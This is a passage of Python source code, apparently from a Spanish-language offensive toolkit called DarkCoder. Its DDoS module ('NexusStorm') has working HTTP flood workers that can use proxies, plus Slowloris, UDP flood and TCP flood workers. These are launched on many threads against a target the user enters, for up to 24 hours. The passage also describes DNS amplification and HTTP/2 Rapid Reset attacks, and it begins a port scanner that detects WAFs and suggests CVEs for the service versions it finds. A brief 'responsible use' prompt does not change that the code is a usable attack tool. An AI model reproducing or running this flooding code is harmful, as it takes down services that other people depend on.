            try:
                sesion.request(metodo_http, target_url_for_request,
                               headers=headers_peticion, data=payload_datos, params=params_get,
                               proxies=proxy_actual, timeout=config_payload.get('timeout_peticion', 3),
                               verify=CONFIG.get("http_verify_ssl", False))
                with self.lock: 
                    self.paquetes_enviados += 1
                    if payload_datos: self.bytes_enviados += len(payload_datos)
                time.sleep(random.uniform(0.001, 0.03)) # Muy pequeña pausa
            except requests.exceptions.RequestException:
                time.sleep(random.uniform(0.05, 0.15))
            except Exception: # Cualquier otro error
                time.sleep(random.uniform(0.1, 0.2))


    def _worker_slowloris(self, ip_objetivo, puerto_objetivo, tiempo_fin, config_payload):
        list_of_sockets = []
        
        path = config_payload.get('path', '/')
        host_header = config_payload.get('host_header', ip_objetivo)

        while time.time() < tiempo_fin and self.ataque_en_curso:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                s.connect((ip_objetivo, puerto_objetivo))
                # Enviar cabecera inicial parcial
                s.send(f"GET {path} HTTP/1.1\r\nHost: {host_header}\r\n".encode("utf-8"))
                s.send(f"User-Agent: {random.choice(self.USER_AGENTS_LIST)}\r\n".encode("utf-8"))
                s.send("Accept-language: en-US,en,q=0.5\r\n".encode("utf-8"))
                list_of_sockets.append(s)
                with self.lock: self.sockets_slowloris_list.append(s) # Global list
                
                with self.lock: self.conexiones_activas_slowloris = len(self.sockets_slowloris_list)
            except socket.error:
                time.sleep(0.1) # Esperar si la conexión falla
                continue # Intentar nueva conexión

            # Mantener conexiones vivas
            intervalo_keep_alive = config_payload.get('slowloris_interval', 10) # Segundos
            while self.ataque_en_curso and time.time() < tiempo_fin :
                time.sleep(intervalo_keep_alive + random.uniform(-2,2)) # Pequeña variación
                if not self.ataque_en_curso: break
                
                temp_list_of_sockets = list(list_of_sockets) # Copia para iterar
                for s_conn in temp_list_of_sockets:
                    if not self.ataque_en_curso: break
                    try:
                        s_conn.send(f"X-a: {random.randint(1, 5000)}\r\n".encode("utf-8"))
                        with self.lock: self.paquetes_enviados +=1 # Contar keep-alive como paquete
                    except socket.error:
                        list_of_sockets.remove(s_conn)
                        with self.lock: 
                            if s_conn in self.sockets_slowloris_list: self.sockets_slowloris_list.remove(s_conn)
                            self.conexiones_activas_slowloris = len(self.sockets_slowloris_list)
                        try: s_conn.close() # Cerrar explícitamente el socket
                        except: pass
                
                # Si se cierran muchos sockets, intentar crear más hasta el límite (num_hilos)
                # Esto se maneja porque el bucle externo creará nuevos sockets si este hilo termina.
                if not list_of_sockets: break # Si todos los sockets de este hilo se cerraron.

        # Cerrar sockets restantes del hilo al finalizar
        for s_conn_final in list_of_sockets:
            try: s_conn_final.close()
            except: pass
            with self.lock:
                if s_conn_final in self.sockets_slowloris_list: self.sockets_slowloris_list.remove(s_conn_final)
        with self.lock: self.conexiones_activas_slowloris = len(self.sockets_slowloris_list)


    def _worker_udp_flood(self, ip_objetivo, puerto_objetivo, tiempo_fin, config_payload):
        payload = config_payload.get('payload_base', os.urandom(1024)) # Payload por defecto
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        # Para puertos aleatorios, si puerto_objetivo es 0
        target_port_actual = puerto_objetivo
        
        while time.time() < tiempo_fin and self.ataque_en_curso:
            try:
                if puerto_objetivo == 0: # Puerto aleatorio
                    target_port_actual = random.randint(1, 65535)

                bytes_sent_this_packet = sock.sendto(payload, (ip_objetivo, target_port_actual))
                with self.lock:
                    self.paquetes_enviados += 1
                    self.bytes_enviados += bytes_sent_this_packet
                time.sleep(config_payload.get('udp_delay', 0.0001)) # Pequeño delay opcional configurable
            except socket.error as se:
                # Errores como "Permission denied" (si se intenta puerto bajo sin root)
                # o "Network is unreachable"
                logging.debug(f"Socket error en UDP flood: {se}")
                time.sleep(0.1) # Pausa mayor en caso de error
            except Exception as e:
                logging.debug(f"Error en UDP flood worker: {e}")
                time.sleep(0.1)
        sock.close()

    def _worker_tcp_flood(self, ip_objetivo, puerto_objetivo, tiempo_fin, config_payload):
        payload = config_payload.get('payload_base', b"X"*1024) # Payload por defecto
        connection_type = config_payload.get('tcp_connection_type', 'SYN') # SYN, ACK, PSH_ACK, RST, FIN
        
        # Para TCP Flood, generalmente se abren y cierran conexiones rápidamente o se envían paquetes sin establecer conexión completa.
        # Para un flood simple de datos sobre conexiones establecidas:
        while time.time() < tiempo_fin and self.ataque_en_curso:
            s = None
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(config_payload.get('tcp_conn_timeout', 1.5)) # Timeout para la conexión
                
                # Si el puerto objetivo es 0, elegir uno aleatorio para cada conexión
                actual_target_port = puerto_objetivo if puerto_objetivo != 0 else random.randint(1, 65535)

                s.connect((ip_objetivo, actual_target_port))
                
                # Enviar payload varias veces o un payload grande
                num_sends = random.randint(1, config_payload.get('tcp_sends_per_conn', 3))
                total_bytes_sent_this_conn = 0
                for _ in range(num_sends):
                    if not self.ataque_en_curso: break
                    bytes_sent = s.send(payload)
                    total_bytes_sent_this_conn += bytes_sent
                    time.sleep(config_payload.get('tcp_send_delay', 0.01)) # Delay entre envíos en la misma conexión

                with self.lock:
                    self.paquetes_enviados += 1 # Contar cada conexión/intento de envío como un "paquete" o "evento"
                    self.bytes_enviados += total_bytes_sent_this_conn

            except socket.timeout:
                logging.debug(f"Timeout conectando a {ip_objetivo}:{actual_target_port} para TCP flood.")
            except socket.error as se:
                logging.debug(f"Socket error en TCP flood connect/send: {se}")
            except Exception as e:
                logging.debug(f"Error en TCP flood worker: {e}")
            finally:
                if s:
                    s.close()
            time.sleep(config_payload.get('tcp_conn_interval', 0.001)) # Intervalo entre nuevas conexiones

    def _ataque_amplificacion_dns_conceptual(self):
        UI.imprimir_advertencia("ATAQUE DE AMPLIFICACIÓN DNS (CONCEPTUAL):", prefix="[!] ")
        UI.imprimir_mensaje("Este ataque es complejo y requiere una lista de resolvedores DNS abiertos y spoofing de IP (generalmente con Scapy o similar).", Colores.AMARILLO)
        UI.imprimir_mensaje("DarkCoder no implementa spoofing de IP real debido a su complejidad y dependencia de privilegios/plataforma.", Colores.AMARILLO)
        UI.imprimir_mensaje("PRINCIPIO: Enviar pequeñas consultas DNS a servidores resolvedores abiertos, con la IP de origen falsificada para que sea la IP de la víctima.", Colores.GRIS)
        UI.imprimir_mensaje("Los resolvedores envían respuestas mucho más grandes a la víctima, amplificando el tráfico.", Colores.GRIS)
        UI.imprimir_mensaje("RIESGOS: Extremadamente disruptivo, fácil de rastrear hasta la red de origen si el spoofing no es perfecto, ilegal en la mayoría de jurisdicciones.", Colores.ROJO)
        logging.warning("Usuario accedió a la descripción conceptual de Amplificación DNS.")

    def _ataque_http2_rapid_reset_conceptual(self):
        UI.imprimir_advertencia("ATAQUE HTTP/2 RAPID RESET (CONCEPTUAL):", prefix="[!] ")
        UI.imprimir_mensaje("Este ataque explota una debilidad en la forma en que los servidores HTTP/2 manejan la cancelación de streams (RST_STREAM frames).", Colores.AMARILLO)
        UI.imprimir_mensaje("PRINCIPIO: El atacante abre muchas streams HTTP/2 y luego las cancela inmediatamente. Esto puede sobrecargar al servidor.", Colores.GRIS)
        UI.imprimir_mensaje("Requiere una biblioteca HTTP/2 de bajo nivel (ej. 'h2' o Scapy con extensiones HTTP/2) para controlar los frames directamente.", Colores.GRIS)
        UI.imprimir_mensaje("DarkCoder, usando 'requests', no tiene este nivel de control. 'requests' abstrae los detalles del protocolo.", Colores.GRIS)
        UI.imprimir_mensaje("RIESGOS: Muy efectivo contra servidores vulnerables, puede ser difícil de mitigar sin parches específicos.", Colores.ROJO)
        logging.warning("Usuario accedió a la descripción conceptual de HTTP/2 Rapid Reset.")

    def lanzar_ataque(self):
        if not self.proceder:
            # Mostrar advertencia de nuevo si el usuario intenta acceder otra vez sin haber aceptado
            self.proceder = self._confirmar_uso_responsable()
            if not self.proceder: return
        
        logging.info("Iniciando configuración de Simulador DDoS NexusStorm.")
        self.threads = [] # Limpiar lista de hilos de ataques anteriores
        self.paquetes_enviados = 0
        self.bytes_enviados = 0
        self.conexiones_activas_slowloris = 0
        self.sockets_slowloris_list = [] # Limpiar sockets de slowloris

        host_o_ip_objetivo_ddos = UI.obtener_entrada("[+] IP o Dominio del Objetivo: ", requerido=True)
        if not host_o_ip_objetivo_ddos: return
        ip_conexion_ddos = self.resolver_objetivo(host_o_ip_objetivo_ddos)
        if not ip_conexion_ddos: logging.error("No se pudo resolver el objetivo DDoS."); return
        
        puerto_objetivo_ddos_val = UI.obtener_entrada("[+] Puerto Objetivo (0 para aleatorio en UDP/TCP): ", tipo=int, default=80, opciones_validas=range(0, 65536))
        duracion_ddos_val = UI.obtener_entrada("[+] Duración del ataque (segundos): ", tipo=int, default=60, opciones_validas=range(1, 86401)) # Max 24h
        num_hilos_ddos_val = UI.obtener_entrada("[+] Número de Hilos/Conexiones: ", tipo=int, default=CONFIG["max_threads_ddos"], opciones_validas=range(1, CONFIG["max_threads_ddos"] + 500))

        # Cargar proxies
        ruta_proxies_config = CONFIG.get("proxies_file")
        default_proxies_path = ruta_proxies_config if ruta_proxies_config and os.path.exists(ruta_proxies_config) else ""
        ruta_proxies_ddos_val = UI.obtener_entrada(f"[+] Ruta al archivo de proxies (opc, ej. proxies.txt): ", default=default_proxies_path, requerido=False)
        if ruta_proxies_ddos_val: self._cargar_proxies_ddos(ruta_proxies_ddos_val)
        
        if self.proxies_disponibles:
            UI.imprimir_mensaje(f"Se usarán {len(self.proxies_disponibles)} proxies. El 'Objetivo' se usará para el Host header.", Colores.AMARILLO)
        
        UI.imprimir_mensaje("Métodos de Ataque Disponibles:", Colores.CYAN)
        metodos_ddos_disp = {
            "1": ("HTTP_GENERIC", "Inundación HTTP (GET/POST/etc, aleatorizada, proxies)"),
            "2": ("SLOWLORIS", "Agotamiento de conexiones HTTP (sin proxy directo)"),
            "3": ("UDP_FLOOD", "Inundación UDP (payload aleatorio, puerto opc. aleatorio)"),
            "4": ("TCP_FLOOD", "Inundación TCP (SYN/Data, payload aleatorio, puerto opc. aleatorio)"),
            "5": ("AMP_DNS_CONCEPT", "Amplificación DNS (Conceptual - Solo Descripción)"),
            "6": ("HTTP2_RR_CONCEPT", "HTTP/2 Rapid Reset (Conceptual - Solo Descripción)")
        }
        for k_m, (nombre_m, desc_m) in metodos_ddos_disp.items(): UI.imprimir_mensaje(f"  [{k_m}] {nombre_m.ljust(18)} - {desc_m}", Colores.BLANCO)
        
        opcion_metodo_ddos_str = UI.obtener_entrada("[+] Método de Ataque (número): ", default="1", opciones_validas=metodos_ddos_disp.keys())
        metodo_seleccionado_ddos, _ = metodos_ddos_disp.get(opcion_metodo_ddos_str, (None,None))
        if not metodo_seleccionado_ddos: UI.imprimir_error("Método de ataque inválido."); logging.error("Método DDoS inválido."); return

        config_payload_actual_ddos = {'host_header': host_o_ip_objetivo_ddos, 'path': "/"}
        config_payload_actual_ddos['timeout_peticion'] = max(1, CONFIG.get("default_timeout", 10) / 2.5) # Timeout petición más agresivo

        # Configuraciones específicas del método
        if metodo_seleccionado_ddos == "HTTP_GENERIC":
            http_method_type = UI.obtener_entrada(f"[+] Método HTTP ({'/'.join(self.HTTP_METHODS_SUPPORTED)}): ", default="GET", opciones_validas=self.HTTP_METHODS_SUPPORTED).upper()
            config_payload_actual_ddos['path'] = UI.obtener_entrada("[+] Ruta HTTP (ej. / o /api/login): ", default="/")
            config_payload_actual_ddos['connection_type'] = UI.obtener_entrada("[+] Tipo de Conexión HTTP (Close/Keep-Alive): ", default="close", opciones_validas=["close", "keep-alive", "Close", "Keep-Alive"]).lower()
            config_payload_actual_ddos['cookies_aleatorias'] = UI.obtener_entrada("[+] ¿Enviar cookies aleatorias complejas? (s/n)", default="s", tipo=bool)
            config_payload_actual_ddos['cache_control'] = UI.obtener_entrada("[+] ¿Enviar cabeceras Anti-Cache (Cache-Control, Pragma)? (s/n)", default="s", tipo=bool)
            config_payload_actual_ddos['random_get_params'] = UI.obtener_entrada("[+] ¿Añadir parámetros GET aleatorios (cache busting)? (s/n)", default="s", tipo=bool)
            if http_method_type in ["POST", "PUT", "PATCH"]:
                config_payload_actual_ddos['content_type'] = UI.obtener_entrada("[+] Content-Type para payload: ", default="application/x-www-form-urlencoded")
                tam_payload_data_ddos = UI.obtener_entrada("[+] Tamaño aprox. de datos de payload aleatorios (bytes, 0 para no enviar): ", tipo=int, default=random.randint(128,512), opciones_validas=range(0,32769))
                if tam_payload_data_ddos > 0: config_payload_actual_ddos['payload_base'] = os.urandom(tam_payload_data_ddos)
        
        elif metodo_seleccionado_ddos == "SLOWLORIS":
            config_payload_actual_ddos['path'] = UI.obtener_entrada("[+] Ruta HTTP para Slowloris (ej. /): ", default="/")
            config_payload_actual_ddos['slowloris_interval'] = UI.obtener_entrada("[+] Intervalo de keep-alive para Slowloris (segundos): ", tipo=int, default=12, opciones_validas=range(5,31))

        elif metodo_seleccionado_ddos == "UDP_FLOOD":
            tam_paq_udp_ddos = UI.obtener_entrada("[+] Tamaño Paquete UDP (bytes): ", tipo=int, default=random.randint(512,1024), opciones_validas=range(1,1473)) #Max Ethernet MTU payload
            config_payload_actual_ddos['payload_base'] = os.urandom(tam_paq_udp_ddos)
            config_payload_actual_ddos['udp_delay'] = UI.obtener_entrada("[+] Delay entre envíos UDP (segundos, 0 para máximo esfuerzo): ", tipo=float, default=0.0001, opciones_validas=range(0,1000)) # float range

        elif metodo_seleccionado_ddos == "TCP_FLOOD":
            # payload_str_tcp_ddos = UI.obtener_entrada(f"[+] Payload TCP (texto): ", default=f"GET / HTTP/1.1\r\nHost: {host_o_ip_objetivo_ddos}\r\nConnection: close\r\n\r\n") # Ejemplo HTTP
            tam_paq_tcp_ddos = UI.obtener_entrada("[+] Tamaño Paquete TCP (bytes) si se envía data: ", tipo=int, default=random.randint(64,512), opciones_validas=range(1,1461)) #Max TCP payload
            config_payload_actual_ddos['payload_base'] = os.urandom(tam_paq_tcp_ddos) # payload_str_tcp_ddos.encode('utf-8')
            config_payload_actual_ddos['tcp_conn_timeout'] = UI.obtener_entrada("[+] Timeout de conexión TCP (segundos): ", tipo=float, default=1.5, opciones_validas=frange(0.1, 10.0))
            config_payload_actual_ddos['tcp_sends_per_conn'] = UI.obtener_entrada("[+] Envíos de payload por conexión TCP: ", tipo=int, default=1, opciones_validas=range(1,11))
            config_payload_actual_ddos['tcp_send_delay'] = UI.obtener_entrada("[+] Delay entre envíos TCP en misma conexión (segundos): ", tipo=float, default=0.01, opciones_validas=frange(0.0, 1.0))
            config_payload_actual_ddos['tcp_conn_interval'] = UI.obtener_entrada("[+] Intervalo entre NUEVAS conexiones TCP (segundos): ", tipo=float, default=0.001, opciones_validas=frange(0.0, 1.0))
            # Nota: TCP Flood tipo SYN puro requeriría Scapy o raw sockets con privilegios. Esto es un flood de datos sobre TCP.

        elif metodo_seleccionado_ddos == "AMP_DNS_CONCEPT": self._ataque_amplificacion_dns_conceptual(); return
        elif metodo_seleccionado_ddos == "HTTP2_RR_CONCEPT": self._ataque_http2_rapid_reset_conceptual(); return

        UI.imprimir_mensaje(f"Preparando asalto {Colores.NEGRITA}{metodo_seleccionado_ddos}{Colores.RESET}{Colores.CYAN} contra {Colores.ROJO}{host_o_ip_objetivo_ddos}:{puerto_objetivo_ddos_val}{Colores.CYAN} (IP conexión: {ip_conexion_ddos})", Colores.CYAN)
        UI.imprimir_mensaje(f"Duración: {duracion_ddos_val}s, Hilos: {num_hilos_ddos_val}, Proxies: {len(self.proxies_disponibles) if self.proxies_disponibles else 'No'}", Colores.CYAN)
        logging.info(f"Iniciando ataque DDoS: Método={metodo_seleccionado_ddos}, Objetivo={host_o_ip_objetivo_ddos}({ip_conexion_ddos}):{puerto_objetivo_ddos_val}, Duración={duracion_ddos_val}s, Hilos={num_hilos_ddos_val}, Proxies={len(self.proxies_disponibles)}")
        
        if not UI.obtener_entrada(f"{Colores.ROJO}{Colores.NEGRITA}CONFIRMAR LANZAMIENTO DE ATAQUE '{metodo_seleccionado_ddos}'? (s/n): {Colores.RESET}", tipo=bool, default=False):
            UI.imprimir_advertencia("Ataque cancelado por el usuario.")
            logging.info("Ataque DDoS cancelado por el usuario antes del lanzamiento.")
            return

        self.ataque_en_curso = True
        tiempo_fin_ataque_ddos = time.time() + duracion_ddos_val
        
        target_worker_func_ddos = None
        args_para_worker_ddos = None

        if metodo_seleccionado_ddos == "HTTP_GENERIC":
            target_worker_func_ddos = self._worker_http_generic
            # ip_conexion_ddos es la IP real, config_payload_actual_ddos['host_header'] es el dominio/IP para el Host header
            args_para_worker_ddos = (ip_conexion_ddos, puerto_objetivo_ddos_val, tiempo_fin_ataque_ddos, http_method_type, config_payload_actual_ddos)
        elif metodo_seleccionado_ddos == "SLOWLORIS":
            target_worker_func_ddos = self._worker_slowloris
            args_para_worker_ddos = (ip_conexion_ddos, puerto_objetivo_ddos_val, tiempo_fin_ataque_ddos, config_payload_actual_ddos)
        elif metodo_seleccionado_ddos == "UDP_FLOOD":
            target_worker_func_ddos = self._worker_udp_flood
            args_para_worker_ddos = (ip_conexion_ddos, puerto_objetivo_ddos_val, tiempo_fin_ataque_ddos, config_payload_actual_ddos)
        elif metodo_seleccionado_ddos == "TCP_FLOOD":
            target_worker_func_ddos = self._worker_tcp_flood
            args_para_worker_ddos = (ip_conexion_ddos, puerto_objetivo_ddos_val, tiempo_fin_ataque_ddos, config_payload_actual_ddos)
        else: UI.imprimir_error("Worker no definido para este método."); return

        UI.imprimir_mensaje(f"{Colores.ROJO}{Colores.NEGRITA}¡¡¡LANZANDO ATAQUE {metodo_seleccionado_ddos}!!!{Colores.RESET}", Colores.ROJO, prefix="!!! ")
        
        for i in range(num_hilos_ddos_val):
            t_ddos = threading.Thread(target=target_worker_func_ddos, args=args_para_worker_ddos, name=f"DDoSWorker-{i+1}")
            t_ddos.daemon = True 
            self.threads.append(t_ddos)
            t_ddos.start()
            time.sleep(0.005) # Stagger thread start slightly

        pbar_ddos = None
        if TQDM_DISPONIBLE:
            desc_pbar_ddos = f"{Colores.ROJO}{Colores.NEGRITA}Asalto {metodo_seleccionado_ddos}{Colores.RESET}"
            postfix_fmt_ddos = "[Pkts: {postfix[0]:>8,}]" # Format with comma for thousands
            if metodo_seleccionado_ddos == "SLOWLORIS": postfix_fmt_ddos += " [Conex: {postfix[1]:>5}]"
            elif metodo_seleccionado_ddos in ["UDP_FLOOD", "TCP_FLOOD"]: postfix_fmt_ddos += " [MB Enviados: {postfix[1]:>8,.2f}]"
            
            pbar_ddos = tqdm(total=duracion_ddos_val, unit="s", desc=desc_pbar_ddos, ncols=110, 
                               bar_format=f'{{desc}}: {{percentage:3.0f}}%|{Colores.MAGENTA}{{bar}}{Colores.RESET}| {{n_fmt}}/{{total_fmt}}s {postfix_fmt_ddos}')
        
        tiempo_inicio_mon_ddos = time.time()
        try:
            while time.time() < tiempo_fin_ataque_ddos and self.ataque_en_curso:
                trans_mon_ddos = time.time() - tiempo_inicio_mon_ddos
                if pbar_ddos:
                    pbar_ddos.n = min(int(trans_mon_ddos), duracion_ddos_val)
                    postfix_data_ddos = [self.paquetes_enviados]
                    if metodo_seleccionado_ddos == "SLOWLORIS": postfix_data_ddos.append(self.conexiones_activas_slowloris)
                    elif metodo_seleccionado_ddos in ["UDP_FLOOD", "TCP_FLOOD"]: postfix_data_ddos.append(self.bytes_enviados / (1024*1024)) # MB
                    pbar_ddos.set_postfix(postfix_data_ddos, refresh=False) # Refresh less often if needed
                    pbar_ddos.refresh()
                else:
                    print_str_ddos = f"{Colores.GRIS}[*] Ataque... T Rest: {int(tiempo_fin_ataque_ddos - time.time())}s, Pkts: {self.paquetes_enviados:,}"
                    if metodo_seleccionado_ddos == "SLOWLORIS": print_str_ddos += f", Conex: {self.conexiones_activas_slowloris}"
                    elif metodo_seleccionado_ddos in ["UDP_FLOOD", "TCP_FLOOD"]: print_str_ddos += f", MB Env: {self.bytes_enviados / (1024*1024):.2f}"
                    print(print_str_ddos + Colores.RESET + " "*10, end='\r', flush=True) # Extra spaces to clear previous line
                time.sleep(0.25) 
        except KeyboardInterrupt:
            UI.imprimir_mensaje("\n¡Ataque DDoS interrumpido por el usuario!", Colores.AMARILLO)
            logging.warning("Ataque DDoS interrumpido por usuario.")
        finally:
            self.ataque_en_curso = False 
            if pbar_ddos: pbar_ddos.close()
            print("\n" + " "*120, end='\r') 
            UI.imprimir_mensaje("Deteniendo hilos DDoS y cerrando sockets (esto puede tardar unos segundos)...", Colores.CYAN)
            
            # Cerrar sockets de Slowloris primero
            if metodo_seleccionado_ddos == "SLOWLORIS":
                temp_sockets_to_close = list(self.sockets_slowloris_list) # Iterate over a copy
                for s_slow_ddos in temp_sockets_to_close:
                    try: s_slow_ddos.close()
                    except: pass
                self.sockets_slowloris_list.clear() # Clear original list
                self.conexiones_activas_slowloris = 0

            # Esperar a que los hilos terminen
            for t_ddos_join in self.threads:
                try:
                    t_ddos_join.join(timeout=2.0) # Darles un poco de tiempo para terminar limpiamente
                except Exception as e_join:
                    logging.debug(f"Error al hacer join del hilo {t_ddos_join.name}: {e_join}")
            self.threads.clear()

            UI.imprimir_exito(f"Ataque {metodo_seleccionado_ddos} finalizado. Total de paquetes/operaciones: {self.paquetes_enviados:,}")
            if metodo_seleccionado_ddos == "SLOWLORIS": UI.imprimir_exito(f"  Conexiones Slowloris finales: {self.conexiones_activas_slowloris}")
            elif metodo_seleccionado_ddos in ["UDP_FLOOD", "TCP_FLOOD"]: UI.imprimir_exito(f"  Total de Megabytes enviados (aprox): {self.bytes_enviados / (1024*1024):.2f} MB")
            logging.info(f"Ataque DDoS finalizado. Pkts/Ops: {self.paquetes_enviados}, Bytes: {self.bytes_enviados}")
            self.proceder = self._confirmar_uso_responsable() # Re-confirmar para el próximo uso

# Funciones de ayuda para frange (range para floats)
def frange(start, stop=None, step=None):
    if stop is None:
        stop = start + 0.0
        start = 0.0
    if step is None:
        step = 1.0
    
    count = 0
    while True:
        temp = float(start + count * step)
        if step > 0 and temp >= stop:
            break
        elif step < 0 and temp <= stop:
            break
        yield temp
        count += 1

# ===== [ ESCÁNER DE PUERTOS Y VULS "SINGULARITYSCAN" ] =====
class EscanerPuertosAvanzado:
    ART_ASCII = f"""{Colores.CYAN}
   ▄████████  ▄██████▄   ▄█     ▄█    ███    █▄     ▄████████  ▄██████▄   ███     
  ███    ███ ███    ███ ███     ███   ████▌   ██    ███    ███ ███    ███ ████▒    
  ███    █▀  ███    ███ ███     ███   ██  █▌  ██    ███    █▀  ███    ███ ██ ██    
 ▄███▄▄▄     ███    ███ ███     ███   ██   █▌ ██    ███        ███    ███ ██  █    
▀▀███▀▀▀     ███    ███ ███     ███   ██    █ ██  ▀███████████ ███    ███ ██   █   
  ███    █▄  ███    ███ ███     ███   ██    █▒██    ███    ███ ███    ███ ██    █  
  ███    ███ ███    ███ ███▌    ███▌  ██   █▒░██    ███    ███ ███    ███ ██     █▒
  ██████████  ▀██████▀  ▀████████▀    █▀  █▒ ░██    ███    ███  ▀██████▀  ████████ 
{Colores.BLANCO}                                Escáner Puertos/Vuls "SingularityScan"{Colores.RESET}"""

    # Puertos comunes (más extenso)
    PUERTOS_TCP_COMUNES = {
        20: "FTP-Data", 21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS",
        80: "HTTP", 81: "HTTP Alt (Tor)", 88: "Kerberos", 110: "POP3", 111: "RPCbind", 113: "Ident",
        135: "MS RPC", 137: "NetBIOS-NS", 138: "NetBIOS-DGM", 139: "NetBIOS-SSN",
        143: "IMAP", 161: "SNMP", 162: "SNMP Trap", 179: "BGP",
        389: "LDAP", 443: "HTTPS", 445: "SMB/CIFS", 465: "SMTPS (SSL/TLS)",
        500: "ISAKMP (VPN)", 512: "rexec", 513: "rlogin", 514: "syslog",
        548: "AFP (Apple Filing Protocol)", 554: "RTSP", 587: "SMTP (Submission)",
        631: "IPP (CUPS)", 636: "LDAPS (SSL/TLS)", 873: "rsync",
        990: "FTPS (SSL/TLS)", 993: "IMAPS (SSL/TLS)", 995: "POP3S (SSL/TLS)",
        1080: "SOCKS Proxy", 1194: "OpenVPN", 1433: "MS SQL Server", 1434: "MS SQL Monitor",
        1521: "Oracle DB", 1723: "PPTP (VPN)",
        2049: "NFS", 2082: "cPanel", 2083: "cPanel SSL", 2086: "WHM", 2087: "WHM SSL",
        2222: "DirectAdmin",
        3000: "Node.js Dev Server", 3268: "MS Global Catalog", 3269: "MS Global Catalog SSL",
        3306: "MySQL", 3389: "RDP",
        5000: "UPnP / Python Flask Dev", 5060: "SIP", 5061: "SIPS",
        5432: "PostgreSQL", 5672: "AMQP (RabbitMQ)", 5900: "VNC", 5901: "VNC Alt", 5985: "WinRM HTTP", 5986: "WinRM HTTPS",
        6000: "X11", 6379: "Redis", 6443: "Kubernetes API",
        7000: "Cassandra", 7001: "WebLogic",
        8000: "HTTP Alt (Django Dev)", 8008: "HTTP Alt", 8080: "HTTP Alt (Tomcat/Proxy)", 8081: "HTTP Alt",
        8443: "HTTPS Alt (Tomcat SSL)", 9000: "SonarQube / PHP-FPM",
        9090: "HTTP Alt (Jenkins/Prometheus)", 9200: "Elasticsearch", 9300: "Elasticsearch Transport",
        10000: "Webmin", 11211: "Memcached",
        27017: "MongoDB", 27018: "MongoDB Shard", 27019: "MongoDB Config",
        30000: "Kubernetes NodePort Min", 32767: "Kubernetes NodePort Max"
    }
    PUERTOS_UDP_COMUNES = {
        53: "DNS", 67: "DHCP Server", 68: "DHCP Client", 69: "TFTP",
        123: "NTP", 137: "NetBIOS-NS", 138: "NetBIOS-DGM", 161: "SNMP", 162: "SNMP Trap",
        500: "ISAKMP (VPN)", 514: "syslog", 1194: "OpenVPN", 1900: "SSDP (UPnP)",
        4500: "IPsec NAT Traversal", 5060: "SIP", 5353: "mDNS (Bonjour)",
        10000: "Webmin (UDP Discovery)", 27015: "Game Server (SRCDS)"
    }
    # Probes para banner grabbing (simplificado)
    BANNER_PROBES = {
        b"GET / HTTP/1.0\r\n\r\n": "HTTP",
        b"HELO example.com\r\n": "SMTP",
        b"SSH-2.0-OpenSSH_7.4\r\n": "SSH", # Un probe que el servidor podría ignorar o responder
        b"\x00": "Generic Null Probe" # Un simple byte nulo
    }
    # Patrones de WAF (muy básico)
    WAF_PATTERNS = [
        re.compile(r"cloudflare", re.I), re.compile(r"incapsula", re.I),
        re.compile(r"akamai", re.I), re.compile(r"sucuri", re.I),
        re.compile(r"aws waf", re.I), re.compile(r"mod_security", re.I),
        re.compile(r"f5 big-ip", re.I), re.compile(r"barracuda", re.I),
        re.compile(r"webknight", re.I), re.compile(r"block.si[cgn]", re.I), # SiteGround
        re.compile(r"forbidden", re.I), re.compile(r"not acceptable", re.I) # Genéricos en respuesta a un payload
    ]
    CVE_SUGGESTIONS_DB = { # Base de conocimiento muy simplificada
        "apache http server 2.4.": ["CVE-2021-42013", "CVE-2021-41773", "CVE-2023-25690"],
        "openssh 7.": ["CVE-2018-15473 (Username Enum)", "CVE-2019-6111"],
        "openssh 8.": ["CVE-2021-41617 (Terrapin)"],
        "vsftpd 2.3.4": ["CVE-2011-2523 (Backdoor)"],
        "proftpd 1.3.5": ["CVE-2015-3306 (mod_copy RCE)"],
        "microsoft iis httpd 7.5": ["CVE-2017-7269 (WebDAV RCE)"],
        "microsoft iis httpd 10.0": ["Vulnerabilidades genéricas de Windows Server, revisar parches"],
        "nginx 1.18.": ["Revisar configuraciones, versiones < 1.19.6 pueden tener problemas con request smuggling"],
        "php/5.": ["Múltiples CVEs, actualizar urgentemente"],
        "php/7.": ["Múltiples CVEs, actualizar a 7.4+ o 8.x"],
        "wordpress": ["Revisar plugins y tema, usar WPScan"],
        "mysql": ["CVE-2012-2122 (Auth Bypass)", "CVE-2016-6662 (RCE)"],
        "postgresql": ["Revisar versiones, ej. CVE-2019-9193 (RCE)"]
    }

    def __init__(self):
        UI.imprimir_mensaje(self.ART_ASCII, Colores.CYAN, prefix="")
        self.puertos_abiertos = [] # Guardará tuplas (ip, puerto, proto, estado, servicio, banner, cves)
        self.os_info = {"guess": "Desconocido", "nmap_details": None, "ping_ttl": None, "accuracy": 0}
        self.waf_detectado = None
        self.shodan_data = None
        self.lock = threading.Lock()
        self.reporte_scan = {}
        self.threads_scan = []
        self.scan_interrupted = False
        logging.info("EscanerPuertosAvanzado (SingularityScan) inicializado.")

    def _obtener_ip_objetivo(self, host_o_ip):
        try:
            return socket.gethostbyname(host_o_ip)
        except socket.gaierror:
            UI.imprimir_error(f"No se pudo resolver el hostname: {host_o_ip}")
            return None

    def _capturar_banner(self, ip, puerto, proto="tcp"):
        banner = "No capturado"
        if proto.lower() != "tcp": return banner # Banner grabbing es principalmente TCP
        
        for probe_bytes, probe_name in self.BANNER_PROBES.items():
            if self.scan_interrupted: break
            try:
                # socket.setdefaulttimeout(CONFIG.get("default_timeout", 10) / 3) # Aplicar timeout global más corto
                # No usar setdefaulttimeout aquí, afecta a otros sockets. Usar s.settimeout()
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(max(1, CONFIG.get("default_timeout", 10) / 3)) # Timeout para esta conexión
                s.connect((ip, puerto))
                s.sendall(probe_bytes)
                banner_raw = s.recv(1024) # Leer hasta 1KB
                s.close()
                try: # Intentar decodificar
                    banner = banner_raw.decode('utf-8', errors='replace').strip()
                except UnicodeDecodeError:
                    banner = repr(banner_raw) # Mostrar representación binaria si no es decodificable
                
                if banner: 
                    logging.debug(f"Banner obtenido de {ip}:{puerto} con probe '{probe_name}': {banner[:60]}...")
                    break # Salir si se obtiene un banner
            except (socket.timeout, socket.error, ConnectionRefusedError):
                continue # Probar siguiente probe
            except Exception as e_banner:
